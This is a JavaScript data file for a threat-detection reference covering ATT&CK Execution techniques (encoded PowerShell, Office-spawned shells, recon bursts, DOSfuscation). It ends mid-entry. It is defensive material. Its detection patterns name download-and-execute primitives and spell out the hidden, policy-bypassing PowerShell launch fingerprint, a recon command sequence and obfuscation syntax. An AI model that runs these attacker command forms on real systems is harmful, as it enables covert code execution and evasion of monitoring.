// TA0002 - Execution
// 13 techniques planned · ~32 indicators total when complete
// Currently built: T1059.001 (4 indicators)
// Other 12 techniques stubbed - see widgets in build session for headline indicators

const DATA = [
  {
    id: "T1059.001",
    name: "Command and Scripting Interpreter: PowerShell",
    desc: "Encoded commands, suspicious parents, in-memory IEX patterns, ExecutionPolicy bypass - the full PS detection stack",
    rows: [
      {
        sub: "T1059.001 - Encoded Command Execution",
        os: "win",
        indicator: "powershell.exe with -EncodedCommand argument - base64-obfuscated payload",
        sysmon: `EventID=1
Image=*\\powershell.exe
CommandLine=*-enc*
  OR *-EncodedCommand*
  OR *-e *
  OR *-ec *`,
        kibana: `winlog.event_id: 1
AND process.name: "powershell.exe"
AND process.command_line: (*-enc* OR *-EncodedCommand* OR *-e\\ * OR *-ec\\ *)`,
        powershell: `Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*powershell*' -and
  $_.Properties[10].Value -match '-e(nc|ncodedcommand)?\\s'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}}`,
        registry: `No persistent artifact unless the -EncodedCommand
payload writes to disk or registry on execution.

Investigation pivots:
- Decode the base64 payload (visible in CommandLine field)
- Check parent process for context - Office/Outlook/Acrobat
  spawning powershell with -enc is highly suspicious
- Look for outbound network connections from the PowerShell
  process (Sysmon EID 3) within the same session
- Check ScriptBlockLogging Event 4104 for the decoded
  script content if logging is enabled`,
        tools: `Cobalt Strike (default PS stagers)
Empire / Starkiller
Nishang
PoshC2
Sliver (PowerShell stagers)
Custom loaders
Manual operators

Note: Microsoft Defender, AMSI, and most EDRs flag
encoded commands by default. Adversaries who still
use them are typically operating against environments
with weaker host telemetry, or are using additional
obfuscation (string concatenation, format operators)
that defeats AMSI string matching.`,
        ossdetect: `Sigma:
- proc_creation_win_powershell_encoded_command.yml
- proc_creation_win_powershell_b64_encoded.yml

Atomic Red Team:
- T1059.001 (multiple atomic tests covering encoded execution)

Hayabusa:
- Multiple PowerShell-encoded rules in default ruleset

Velociraptor artifacts:
- Windows.Detection.PowerShell.EncodedCommand
- Windows.System.Powershell.PSReadline (history forensics)

YARA:
- Florian Roth's signature-base PowerShell rules`,
        notes: "Encoded PowerShell remains the most common adversary execution method even in 2026 because it (a) defeats simple keyword-matching detection, (b) handles arbitrary script content including special characters, and (c) is built into PowerShell itself with no additional tooling. Detection sweet spot: combine the -EncodedCommand arg with parent-process context. Office app spawning powershell -enc = high-confidence phish chain. Service spawning powershell -enc = potential persistence. svchost spawning powershell -enc = likely WMI-based execution. The encoded payload itself is base64; decoding requires UTF-16LE encoding (not ASCII) - a common pitfall in incident response.",
        apt: [
          { cls: "apt-mul", name: "Red Team", note: "Universal in Cobalt Strike, Empire, and most C2 framework default stagers." },
          { cls: "apt-mul", name: "Ransomware", note: "Universal across modern ransomware affiliate operations for staging." },
          { cls: "apt-ru", name: "APT29", note: "Encoded PowerShell extensively used in SolarWinds and ongoing operations." },
          { cls: "apt-kp", name: "Lazarus", note: "Encoded PowerShell stagers in cryptocurrency-targeted operations." },
          { cls: "apt-cn", name: "APT41", note: "Documented in operations against tech sector." },
          { cls: "apt-mul", name: "Multi", note: "Documented across virtually all modern operations using PowerShell." }
        ],
        cite: "MITRE ATT&CK T1059.001"
      },
      {
        sub: "T1059.001 - Suspicious Parent Process",
        os: "win",
        indicator: "powershell.exe spawned by Office, Adobe, or other unusual parent - phishing chain indicator",
        sysmon: `EventID=1
Image=*\\powershell.exe
ParentImage=
  *\\winword.exe
  OR *\\excel.exe
  OR *\\powerpnt.exe
  OR *\\outlook.exe
  OR *\\acrord32.exe
  OR *\\acrobat.exe
  OR *\\mshta.exe
  OR *\\wmiprvse.exe
  OR *\\wscript.exe
  OR *\\cscript.exe`,
        kibana: `winlog.event_id: 1
AND process.name: "powershell.exe"
AND process.parent.name: ("winword.exe" OR "excel.exe" OR "powerpnt.exe" OR "outlook.exe" OR "acrord32.exe" OR "acrobat.exe" OR "mshta.exe" OR "wmiprvse.exe")`,
        powershell: `Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -match 'powershell' -and
  $_.Properties[20].Value -match
    'winword|excel|powerpnt|outlook|acrord32|acrobat|mshta|wmiprvse'
} | Select TimeCreated,
  @{n='Parent';e={$_.Properties[20].Value}},
  @{n='Child';e={$_.Properties[4].Value}},
  @{n='CmdLine';e={$_.Properties[10].Value}}`,
        registry: `Office macro artifacts:
- %APPDATA%\\Microsoft\\Templates\\*.dotm
- %APPDATA%\\Microsoft\\Word\\STARTUP\\*.dotm
- %APPDATA%\\Microsoft\\Excel\\XLSTART\\*.xlsm

Outlook attachment cache:
- %TEMP%\\Outlook Logging\\
- %APPDATA%\\Local\\Microsoft\\Windows\\INetCache\\
  Content.Outlook\\

PowerShell history (if not cleared):
- %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\
  ConsoleHost_history.txt

Acrobat artifacts:
- %APPDATA%\\Adobe\\Acrobat\\<version>\\Cache\\`,
        tools: `Phishing operators (universal)
Malicious document loaders (Emotet, IcedID, QakBot history)
Malicious PDFs with embedded scripts
HTA droppers
Macro-based loaders (despite MOTW mitigations)
ISO/IMG/ONE container chains (post-MOTW evasion)

Modern observation: Microsoft's "Mark of the Web"
mitigations broke macro-based phishing in 2022.
Adversaries pivoted to ISO/IMG containers (no MOTW),
LNK files, and OneNote (.one) files. The parent-spawn
pattern still holds - just check additional parents.`,
        ossdetect: `Sigma:
- proc_creation_win_office_outlook_spawn_susp.yml
- proc_creation_win_office_susp_child.yml
- Many variants per Office app

Atomic Red Team:
- T1566.001 (phishing - linked technique)
- Various tests reproduce Office→PowerShell chain

Hayabusa:
- SuspParentChild rules in default ruleset
- Office spawn detection rules

Velociraptor:
- Windows.Detection.OfficeSpawn

EDR queries (CrowdStrike/Defender example):
event_simpleName=ProcessRollup2
ParentBaseFileName IN ("WINWORD.EXE","EXCEL.EXE",
  "POWERPNT.EXE","OUTLOOK.EXE","AcroRd32.exe")
ImageFileName IN ("powershell.exe","cmd.exe")`,
        notes: "Office-spawning-PowerShell is one of the highest-fidelity initial-access detections in modern environments. The technique pre-dates ATT&CK itself - 'macro spawns shell' has been a phishing detection target for over a decade. Modern phishing increasingly uses container-types (ISO/IMG/ONE) to bypass MOTW, but the ultimate execution still goes through PowerShell or CMD eventually. Tune by user role: developers and admins legitimately spawn PowerShell from various contexts; finance/HR/sales users almost never do, especially from Office apps. Pair with: outbound network connections in the PowerShell child process, file writes to %TEMP% / %APPDATA%, subsequent persistence creation (scheduled tasks, registry run keys).",
        apt: [
          { cls: "apt-mul", name: "Phishing", note: "Universal in phishing-based initial access operations." },
          { cls: "apt-mul", name: "Initial Access", note: "Standard pattern across initial access broker operations." },
          { cls: "apt-ru", name: "APT28", note: "Office-based phishing extensively documented." },
          { cls: "apt-kp", name: "Lazarus", note: "Office and HWP-based phishing in operations against South Korea and Japan." },
          { cls: "apt-mul", name: "Ransomware", note: "Standard phishing→PowerShell chain in many ransomware affiliate operations." },
          { cls: "apt-mul", name: "Multi", note: "Documented across virtually all phishing-based operations targeting Windows endpoints." }
        ],
        cite: "MITRE ATT&CK T1059.001, T1566.001"
      },
      {
        sub: "T1059.001 - Suspicious ScriptBlock Content",
        os: "win",
        indicator: "PowerShell ScriptBlock containing IEX/DownloadString/Invoke-Expression - fileless execution patterns",
        sysmon: `[ScriptBlockLogging required - separate event channel]
EventID=4104 in
Microsoft-Windows-PowerShell/Operational
ScriptBlockText contains:
  IEX OR Invoke-Expression
  OR DownloadString
  OR Net.WebClient
  OR FromBase64String
  OR DownloadFile
  OR Reflection.Assembly`,
        kibana: `winlog.channel: "Microsoft-Windows-PowerShell/Operational"
AND winlog.event_id: 4104
AND winlog.event_data.ScriptBlockText: (*IEX* OR *Invoke-Expression* OR *DownloadString* OR *Net.WebClient* OR *FromBase64String* OR *DownloadFile* OR *Reflection.Assembly*)`,
        powershell: `Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-PowerShell/Operational';
  ID=4104
} | Where-Object {
  $_.Message -match
    'IEX|Invoke-Expression|DownloadString|FromBase64String|Net\\.WebClient|Reflection\\.Assembly'
} | Select TimeCreated, Id,
  @{n='Snippet';e={
    ($_.Message -split [Environment]::NewLine)[0..3] -join "; "
  }}`,
        registry: `ScriptBlockLogging must be enabled to capture this:
HKLM\\Software\\Policies\\Microsoft\\Windows\\
  PowerShell\\ScriptBlockLogging
  EnableScriptBlockLogging = 1 (REG_DWORD)

Module logging (broader, more verbose):
HKLM\\Software\\Policies\\Microsoft\\Windows\\
  PowerShell\\ModuleLogging
  EnableModuleLogging = 1
  ModuleNames\\* = * (log all modules)

Transcription (full session capture):
HKLM\\Software\\Policies\\Microsoft\\Windows\\
  PowerShell\\Transcription
  EnableTranscripting = 1
  OutputDirectory = <secure logging path>

These should be set via GPO across the enterprise.
If absent: this detection fires on nothing.`,
        tools: `Empire stagers (extensive use of IEX)
Cobalt Strike PowerShell delivery
Manual operators (post-exploitation)
Custom downloaders
PowerSploit (PowerView, PowerUp, etc.)
Nishang (extensive IEX use)
PoshC2

Common phrases to search:
- "IEX (New-Object Net.WebClient).DownloadString(..."
- "[System.Convert]::FromBase64String(..."
- "[Reflection.Assembly]::Load([Convert]::From..."`,
        ossdetect: `Sigma:
- ps_script_susp_iex.yml
- ps_script_download_string.yml
- ps_script_reflection_assembly_load.yml
- ps_script_net_webclient.yml
- Many additional PS rules in SigmaHQ repo

Atomic Red Team:
- T1059.001 #1, #2 (multiple ScriptBlock-triggering tests)

Hayabusa:
- Many ScriptBlock-based rules in default ruleset
- "Suspicious PowerShell ScriptBlock" category

Velociraptor:
- Windows.EventLogs.PowerShell
- Built-in IOC matching for known IOCs in script content`,
        notes: "ScriptBlock logging (Event 4104) captures the actual code being executed AFTER PowerShell de-obfuscates it - meaning even if the command-line shows -EncodedCommand <base64>, the 4104 event shows the decoded script. This is the most powerful PowerShell visibility you can get. Caveat: it must be enabled via GPO. Many environments don't have it on by default. Detection signal-to-noise is high: legitimate PowerShell use rarely contains IEX + DownloadString + Net.WebClient in the same script. AMSI integration with PowerShell 5+ further enhances this - when AMSI flags a ScriptBlock as malicious, you get Event ID 4104 with content + Event ID 5061 from Microsoft-Windows-PowerShell/Admin. Combine for highest fidelity. Adversary countermove: AMSI bypass via memory patching (Patriot, AMSI.fail) - detection shifts to Sysmon EID 7 (Image Load) of amsi.dll into PowerShell, which is itself suspicious.",
        apt: [
          { cls: "apt-mul", name: "Red Team", note: "Universal in red team post-exploitation." },
          { cls: "apt-mul", name: "Ransomware", note: "Standard staging pattern across ransomware operations." },
          { cls: "apt-ru", name: "APT29", note: "Documented in SolarWinds and ongoing espionage operations." },
          { cls: "apt-kp", name: "Lazarus", note: "PowerShell-based stagers in cryptocurrency operations." },
          { cls: "apt-cn", name: "APT41", note: "PowerShell post-exploitation in operations against tech sector." },
          { cls: "apt-mul", name: "Multi", note: "Documented in CISA AA23-320A Scattered Spider operations and across ransomware playbooks." }
        ],
        cite: "MITRE ATT&CK T1059.001"
      },
      {
        sub: "T1059.001 - Execution Policy Bypass",
        os: "win",
        indicator: "powershell.exe with -ExecutionPolicy Bypass - script restrictions disabled",
        sysmon: `EventID=1
Image=*\\powershell.exe
CommandLine matches:
  *ExecutionPolicy*Bypass*
  OR *-ep bypass*
  OR *-ep unrestricted*
  OR *-exec bypass*
  OR *-exec unrestricted*`,
        kibana: `winlog.event_id: 1
AND process.name: "powershell.exe"
AND process.command_line: (*ExecutionPolicy*Bypass* OR *-ep\\ bypass* OR *-ep\\ unrestricted* OR *-exec\\ bypass* OR *-exec\\ unrestricted*)`,
        powershell: `Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*powershell*' -and
  $_.Properties[10].Value -match
    '-(ExecutionPolicy|ep|exec)\\s+(bypass|unrestricted)'
} | Select TimeCreated,
  @{n='User';e={$_.Properties[12].Value}},
  @{n='Parent';e={$_.Properties[20].Value}},
  @{n='CmdLine';e={$_.Properties[10].Value}}`,
        registry: `No persistent artifact - the bypass is per-session.

Investigation pivots:
- Process ancestry: who called PowerShell with -ep bypass?
  Legitimate IT scripts often use this; legitimate user
  activity rarely does.
- Combined flags: -NoProfile -NonInteractive -WindowStyle Hidden
  alongside -ep bypass = adversary tooling fingerprint
- Session start time + outbound network connections = chain
  into broader investigation
- Check %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\
  ConsoleHost_history.txt for command history if available`,
        tools: `Cobalt Strike default stagers
Empire stagers
Manual operators
Most adversary PowerShell tooling
PoshC2
Nishang

Common combined flag pattern (full adversary fingerprint):
powershell.exe -NoProfile -NonInteractive
  -WindowStyle Hidden -ExecutionPolicy Bypass
  -EncodedCommand <base64>

Or shortened:
powershell -nop -w hidden -ep bypass -enc <base64>`,
        ossdetect: `Sigma:
- proc_creation_win_powershell_execution_policy_bypass.yml
- proc_creation_win_powershell_susp_command_line.yml
  (combines -ep bypass + other suspicious flags)

Atomic Red Team:
- T1059.001 #3 (ExecutionPolicy bypass test)

Hayabusa:
- ExecPolicy bypass rules in default ruleset
- "PowerShell suspicious flags" category

Velociraptor:
- Windows.Detection.PowerShell.SuspiciousFlags`,
        notes: "ExecutionPolicy is one of the most misunderstood security features in PowerShell - it's not a security boundary. Microsoft documents it explicitly as 'not a security feature' but as a 'safety guardrail.' Adversaries bypass it trivially with -ExecutionPolicy Bypass, but ALSO with: -EncodedCommand (no script file = no policy check), running PowerShell scripts via Get-Content + IEX, or just calling powershell.exe -Command directly. The detection value of catching -ep bypass isn't in stopping the bypass - it's that legitimate IT scripts rarely need it (they sign their scripts) while adversary tooling almost always uses it. False-positive sources: software installers that bundle PowerShell scripts, vendor monitoring agents, some legitimate sysadmin one-liners. Build allowlists by source/parent process. Pair with combined-flag detection: -nop -w hidden -ep bypass is essentially an adversary fingerprint when seen together.",
        apt: [
          { cls: "apt-mul", name: "Red Team", note: "Universal flag pattern in red team operations." },
          { cls: "apt-mul", name: "Ransomware", note: "Standard in ransomware staging." },
          { cls: "apt-ru", name: "APT29", note: "Documented in ongoing espionage operations." },
          { cls: "apt-kp", name: "Lazarus", note: "Standard in PowerShell-based stagers." },
          { cls: "apt-mul", name: "Multi", note: "Often combined with -EncodedCommand and -NonInteractive flags as full adversary fingerprint." }
        ],
        cite: "MITRE ATT&CK T1059.001"
      }
    ]
  },
  // ── STUBS for remaining 12 techniques ──
  // Each stub has the structure ready and headline indicator from build session.
  // Future sessions fill out 2-4 indicators per technique with full schema.
  {
    id: "T1059.003",
    name: "Command and Scripting Interpreter: Windows Command Shell",
    desc: "cmd.exe LOLBin chains, recon command bursts, parent-process anomalies, DOSfuscation",
    rows: [
      {
        sub: "T1059.003 - Suspicious Parent Process",
        os: "win",
        indicator: "cmd.exe spawned by Office, Adobe, or scripting host - phishing or macro execution chain",
        sysmon: `EventID=1
Image=*\\cmd.exe
ParentImage=
  *\\winword.exe
  OR *\\excel.exe
  OR *\\powerpnt.exe
  OR *\\outlook.exe
  OR *\\acrord32.exe
  OR *\\acrobat.exe
  OR *\\mshta.exe
  OR *\\wscript.exe
  OR *\\cscript.exe
  OR *\\wmiprvse.exe`,
        kibana: `winlog.event_id: 1
AND process.name: "cmd.exe"
AND process.parent.name: ("winword.exe" OR "excel.exe" OR "powerpnt.exe" OR "outlook.exe" OR "acrord32.exe" OR "acrobat.exe" OR "mshta.exe" OR "wscript.exe" OR "cscript.exe" OR "wmiprvse.exe")`,
        powershell: `Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\cmd.exe' -and
  $_.Properties[20].Value -match
    'winword|excel|powerpnt|outlook|acrord32|acrobat|mshta|wscript|cscript|wmiprvse'
} | Select TimeCreated,
  @{n='Parent';e={$_.Properties[20].Value}},
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='User';e={$_.Properties[12].Value}}`,
        registry: `Office macro artifacts (same as T1059.001 parent indicator):
- %APPDATA%\\Microsoft\\Templates\\*.dotm
- %APPDATA%\\Microsoft\\Word\\STARTUP\\*.dotm
- %APPDATA%\\Microsoft\\Excel\\XLSTART\\*.xlsm

Outlook attachment cache:
- %APPDATA%\\Local\\Microsoft\\Windows\\INetCache\\
  Content.Outlook\\

LNK targets (often used as cmd.exe launchers post-MOTW):
- %APPDATA%\\Roaming\\Microsoft\\Windows\\Recent\\*.lnk
- Shell:startup\\*.lnk (if persistence also in play)

Zone.Identifier ADS on container files
(confirms download origin vs internal):
- Right-click file -> Properties -> Unblock, or
- Get-Item file.exe -Stream Zone.Identifier`,
        tools: `Phishing operators (universal)
Malicious Office macro loaders
HTA droppers (mshta -> cmd chain)
VBScript / WScript loaders
ISO/LNK containers (post-MOTW evasion, 2022+)
OneNote (.one) embedded attachment runners

Modern observation: as with PowerShell parent detection,
the parent list must evolve with phishing trends.
Post-2022 additions worth monitoring:
- explorer.exe (ISO mount auto-run via LNK)
- %TEMP%\\*.tmp (staging via temp dir)
- onenoteim.exe (OneNote embedded script runners)`,
        ossdetect: `Sigma:
- proc_creation_win_office_cmd_child.yml
- proc_creation_win_susp_cmd_parent_process.yml
- proc_creation_win_office_susp_child.yml (covers both cmd and PS)

Atomic Red Team:
- T1566.001 (phishing - upstream technique)
- T1059.003 Test #2 (cmd from script host)

Hayabusa:
- SuspParentChild rules include cmd.exe variants
- Office spawn detection (cmd + PS variants)

Velociraptor:
- Windows.Detection.OfficeSpawn
  (covers cmd.exe and powershell.exe children)`,
        notes: "Office-spawning-cmd is the cmd.exe equivalent of the PowerShell parent indicator - same logic, same high fidelity, slightly different toolchain. Where PowerShell is preferred for in-memory staging, cmd.exe is often used as a relay: the macro or HTA spawns cmd.exe, which then chains into something else (certutil, bitsadmin, curl, etc.). That chaining pattern - cmd spawning a network-capable LOLBin - is worth treating as a separate pivot: look at Sysmon EID 1 events where cmd.exe is BOTH child (suspicious parent) and parent (spawning LOLBin) within the same process tree. False positives are low for end-user machines. Admin and developer workstations will generate noise. Tune by user role and parent-child pair, not just parent alone.",
        apt: [
          { cls: "apt-mul", name: "Phishing", note: "Universal in phishing chains - macro or HTA drops cmd, cmd relays to next stage." },
          { cls: "apt-ru", name: "APT28", note: "Office-based phishing chains invoking cmd.exe extensively documented." },
          { cls: "apt-kp", name: "Lazarus", note: "HTA and Office macro loaders spawning cmd.exe in cryptocurrency-targeted operations." },
          { cls: "apt-ir", name: "APT35", note: "Macro-based initial access chains documented in CISA advisories." },
          { cls: "apt-mul", name: "Ransomware", note: "Affiliate operators use Office-to-cmd chains as standard initial access pathway." }
        ],
        cite: "MITRE ATT&CK T1059.003, T1566.001"
      },
      {
        sub: "T1059.003 - Post-Compromise Recon Command Burst",
        os: "win",
        indicator: "Rapid sequence of discovery commands from cmd.exe - whoami, ipconfig, net user, systeminfo within short window",
        sysmon: `EventID=1
Image=*\\cmd.exe OR *\\whoami.exe
  OR *\\ipconfig.exe OR *\\net.exe
  OR *\\systeminfo.exe OR *\\hostname.exe
  OR *\\nltest.exe OR *\\arp.exe
  OR *\\route.exe OR *\\tasklist.exe

// Logical spec: alert when 4+ of these images
// appear with the same ParentProcessId or same
// user session within a 60-second window.
// Single-event Sysmon filters cannot express this;
// use Kibana or Sigma correlation rule below.`,
        kibana: `// Correlation query - run over short time window (60-120s)
winlog.event_id: 1
AND process.name: (
  "whoami.exe" OR "ipconfig.exe" OR "net.exe" OR
  "systeminfo.exe" OR "hostname.exe" OR "nltest.exe" OR
  "arp.exe" OR "route.exe" OR "tasklist.exe" OR
  "netstat.exe" OR "qwinsta.exe"
)
// Then aggregate: if same user or same parent spawns
// 4+ distinct process names in < 120s, alert.
// Use Kibana Threshold rule or EQL sequence for correlation.`,
        powershell: `# Hunt for recon command bursts in Sysmon EID 1
# Looks for 4+ distinct recon binaries per user per 2-minute window
$reconBinaries = @(
  'whoami.exe','ipconfig.exe','net.exe','systeminfo.exe',
  'hostname.exe','nltest.exe','arp.exe','route.exe',
  'tasklist.exe','netstat.exe','qwinsta.exe','nslookup.exe'
)

$windowSecs = 120

Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational'; ID=1
} | Where-Object {
  $bin = ($_.Properties[4].Value -split '\\\\')[-1]
  $reconBinaries -contains $bin
} | Select TimeCreated,
  @{n='Binary';e={($_.Properties[4].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}},
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='ParentCmdLine';e={$_.Properties[21].Value}} |
  Group-Object User |
  ForEach-Object {
    $user = $_.Name
    $events = $_.Group | Sort-Object TimeCreated
    for ($i=0; $i -lt $events.Count; $i++) {
      $window = $events | Where-Object {
        [Math]::Abs(($_.TimeCreated - $events[$i].TimeCreated).TotalSeconds) -le $windowSecs
      }
      if (($window.Binary | Select-Object -Unique).Count -ge 4) {
        [PSCustomObject]@{
          User       = $user
          StartTime  = $events[$i].TimeCreated
          BinariesRun = ($window.Binary | Select-Object -Unique) -join ', '
          Count      = ($window.Binary | Select-Object -Unique).Count
        }
        break
      }
    }
  } | Where-Object { $_ -ne $null }`,
        registry: `No direct registry artifact from recon commands.

Investigation pivots:
- Sysmon EID 3 (NetworkConnect) from same session:
  nltest and net.exe can generate LDAP/SMB traffic -
  pivot to network logs to see what systems were queried
- User profile writes from systeminfo:
  none by default; output is stdout only
- Command history if not cleared:
  %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\
  ConsoleHost_history.txt (PowerShell-launched cmds only)
- Prefetch (if enabled - off by default on servers):
  C:\\Windows\\Prefetch\\WHOAMI.EXE-*.pf timestamps
  confirm first vs repeated execution`,
        tools: `Manual operator post-exploitation (most common)
Cobalt Strike built-in reconnaissance commands
Metasploit post-exploitation modules
Empire / Starkiller discovery modules
Impacket tooling (for remote variants)

Standard adversary recon sequence seen across
many documented operations:
  whoami /all          - current user + privileges
  hostname             - machine name
  ipconfig /all        - network config + DNS suffix
  net user             - local users
  net localgroup administrators - admin group members
  net view             - visible shares/hosts
  systeminfo           - OS/patch level
  nltest /domain_trusts - domain trust enumeration
  tasklist /svc        - running services

The sequence order and timing distinguishes manual
operators from scripted tooling - manual operators
run commands with human-paced gaps; scripts run
them near-simultaneously.`,
        ossdetect: `Sigma:
- win_susp_recon_activity.yml (Florian Roth)
- proc_creation_win_recon_discovery.yml
- Multiple individual detection rules per binary

Elastic EQL (Event Query Language) example:
sequence with maxspan=2m
  [process where process.name == "whoami.exe"]
  [process where process.name == "net.exe"]
  [process where process.name == "ipconfig.exe"]

Atomic Red Team:
- T1087.001 (Local Account Discovery)
- T1016 (System Network Configuration Discovery)
- T1082 (System Information Discovery)
- Many individual discovery tests that reproduce
  the component commands

Velociraptor:
- Windows.System.Pslist + correlation
- Windows.EventLogs.Sysmon (with filters)`,
        notes: "Individual recon commands like whoami and ipconfig run constantly in healthy enterprise environments - IT scripts, monitoring agents, login scripts. The detection is not per-command but per-burst: multiple distinct recon binaries run by the same user or from the same parent process within a short time window. This is almost exclusively human operator behavior post-compromise. The timing gap between commands is a secondary signal: automated tools run commands in milliseconds; human operators take 2-30 seconds between commands. Sysmon alone cannot express the windowed-count correlation - you need Kibana threshold rules, EQL sequences, or a SIEM aggregation query. This is one of the cases where the PowerShell hunt script above is genuinely useful for rapid triage without a SIEM. APT attribution is broad because this is a universal technique - every threat actor who gains shell access does some version of this recon sequence.",
        apt: [
          { cls: "apt-mul", name: "All Operators", note: "Universal post-compromise behavior - virtually every documented intrusion includes a recon command burst." },
          { cls: "apt-ru", name: "APT29", note: "Documented in SolarWinds post-compromise activity." },
          { cls: "apt-cn", name: "APT41", note: "Discovery command sequences documented across multiple sectors." },
          { cls: "apt-kp", name: "Lazarus", note: "Standard recon sequence documented in CISA advisories on DPRK operators." },
          { cls: "apt-mul", name: "Ransomware", note: "Pre-encryption recon (network share and user enumeration) is standard across ransomware operations." }
        ],
        cite: "MITRE ATT&CK T1059.003, T1087.001, T1016, T1082"
      },
      {
        sub: "T1059.003 - DOSfuscation / Command Obfuscation",
        os: "win",
        indicator: "cmd.exe command string with excessive carets, quoted null insertions, or comma/semicolon delimiters - obfuscated shell syntax",
        sysmon: `EventID=1
Image=*\\cmd.exe
CommandLine matches (any of):
  - 3+ consecutive carets: ^^^
  - Quoted empty string insertion: ""c""m""d or s^e^t
  - Comma/semicolon as token separators: cmd,/c or
    c;m;d;.;e;x;e
  - Environment variable substring: %ComSpec:~0,3%

// Logical spec: regex on CommandLine field.
// Sysmon XML config does not support regex in
// CommandLine match; use Kibana pcre or Sigma
// detection below for runtime alerting.`,
        kibana: `winlog.event_id: 1
AND process.name: "cmd.exe"
AND process.command_line: /(\^{3,}|\"\"[a-z]\"\"|\,[\/\\\\]|;[a-z];|%[A-Za-z]+:~[0-9]+,[0-9]+%)/

// Alternative plaintext-match approach (lower fidelity):
AND process.command_line: (*^^^* OR *""c""* OR *,/c* OR *;m;d;*)`,
        powershell: `# Hunt for DOSfuscated cmd.exe command lines in Sysmon EID 1
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\cmd.exe' -and (
    # 3+ consecutive carets
    $_.Properties[10].Value -match '\^{3,}' -or
    # Quoted null-string insertion (s""et, c""md, etc.)
    $_.Properties[10].Value -match '""\w""' -or
    # Comma or semicolon as command token separator
    $_.Properties[10].Value -match '[,;][/\\\\cC]' -or
    # Environment variable substring extraction
    $_.Properties[10].Value -match '%[A-Za-z_]+:~\d+,\d+%'
  )
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={$_.Properties[20].Value}},
  @{n='User';e={$_.Properties[12].Value}}`,
        registry: `No registry artifact directly.

Context: DOSfuscation is almost always a wrapper around
something substantive - the obfuscated outer shell
eventually invokes a real payload.

Investigation pivots:
- Child processes of the obfuscated cmd.exe:
  what did cmd.exe actually launch?
  Sysmon EID 1, filter ParentProcessId = <suspicious cmd PID>
- Network connections from child processes:
  Sysmon EID 3 within same session
- File writes from child processes:
  Sysmon EID 11 (FileCreate) or EID 15 (FileCreateStreamHash)
- Decode the obfuscation manually:
  Remove carets (they escape the next char in cmd.exe)
  Remove quoted null strings ("" between tokens = nothing)
  Reconstruct the actual command to understand intent`,
        tools: `DOSfuscation tool by Daniel Bohannon (2018)
  - Published tool for demonstrating cmd.exe obfuscation
  - Multiple layers: token, string, encoding techniques
  - GitHub: danielbohannon/Invoke-DOSfuscation

Manual operator technique (carets + quoted nulls)
Malware staging scripts
Some ransomware dropper chains

Note: DOSfuscation is significantly less common than
PowerShell obfuscation in modern operations. Most
adversaries prefer PowerShell's richer obfuscation
options (-EncodedCommand, string concatenation, etc.).
cmd.exe obfuscation appears most in:
- Older malware lineages
- Environments where PS execution is blocked or monitored
- Manual operators who default to cmd.exe tradecraft`,
        ossdetect: `Sigma:
- proc_creation_win_cmd_dosfuscation.yml (Florian Roth)
- proc_creation_win_cmd_susp_special_chars.yml
- proc_creation_win_susp_cmd_obfuscation.yml

Atomic Red Team:
- T1059.003 Test #3 (DOSfuscation variants)
- Invoke-DOSfuscation manual tests

Daniel Bohannon research:
- "DOSfuscation: Exploring the Depths of Cmd.exe
  Obfuscation and Detection Techniques" (2018 DEF CON)
- Core reference for understanding all variants

Hayabusa:
- cmd-obfuscation rules in default ruleset

Velociraptor:
- Windows.EventLogs.Sysmon + regex filter on CommandLine`,
        notes: "DOSfuscation exploits cmd.exe's quirky parsing rules - carets are escape characters, quoted empty strings are silently removed, commas and semicolons can substitute for spaces in certain positions. The result is command strings that look like noise but execute normally. The core reference is Daniel Bohannon's 2018 DEF CON talk and the Invoke-DOSfuscation tool. Detection angle: legitimate cmd.exe usage almost never contains 3+ consecutive carets or quoted null strings mid-token. These patterns have near-zero false-positive rate in normal enterprise telemetry - they're detectable because the obfuscation itself is anomalous. The deeper hunt is what the obfuscated command actually does: decode the outer shell (drop carets, remove quoted nulls, resolve env var substrings) and analyze the revealed payload. Kibana regex on CommandLine is more reliable than Sysmon config-level filtering here because Sysmon's XML match syntax doesn't support regex in CommandLine fields - this is one of the genuine cases where the Kibana column catches things the Sysmon column misses at config time.",
        apt: [
          { cls: "apt-mul", name: "Commodity Malware", note: "DOSfuscation present in several malware families using cmd.exe staging." },
          { cls: "apt-cn", name: "APT41", note: "Cmd-level obfuscation documented in intrusions against gaming and tech sectors." },
          { cls: "apt-mul", name: "Ransomware", note: "Some ransomware droppers use DOSfuscated cmd.exe wrappers for staging scripts." }
        ],
        cite: "MITRE ATT&CK T1059.003, T1027"
      }
    ]
  },
  {
    id: "T1059.005",
    name: "Command and Scripting Interpreter: Visual Basic",
    desc: "VBA macros, vbscript via wscript/cscript, Office-driven script execution",
    rows: [
      {
        sub: "T1059.005 - Office Macro Spawning Script Host",
        os: "win",
        indicator: "wscript.exe or cscript.exe spawned by Office application - VBA macro executing VBScript payload",
        sysmon: `EventID=1
Image=*\\wscript.exe OR *\\cscript.exe
ParentImage=
  *\\winword.exe
  OR *\\excel.exe
  OR *\\powerpnt.exe
  OR *\\outlook.exe
  OR *\\onenote.exe
  OR *\\msaccess.exe
  OR *\\mspub.exe`,
        kibana: `winlog.event_id: 1
AND process.name: ("wscript.exe" OR "cscript.exe")
